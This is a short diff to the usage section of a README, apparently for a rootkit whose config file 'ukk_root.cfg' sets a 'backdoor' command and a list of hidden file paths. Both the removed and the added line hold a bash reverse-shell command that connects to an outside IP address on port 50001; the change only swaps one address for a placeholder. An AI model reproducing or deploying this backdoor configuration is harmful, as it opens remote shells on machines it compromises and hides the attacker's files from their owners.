@@ -25,7 +25,7 @@ install:
 ## USE
 ukk_root.cfg:
 ```shell
-backdoor = "bash -c 'bash -i >& /dev/tcp/123.249.89.38/50001 0>&1'";
+backdoor = "bash -c 'bash -i >& /dev/tcp/123.123.123.123/50001 0>&1'";
 
 hidden = (  
   { path = "/etc/uroot.cfg" },
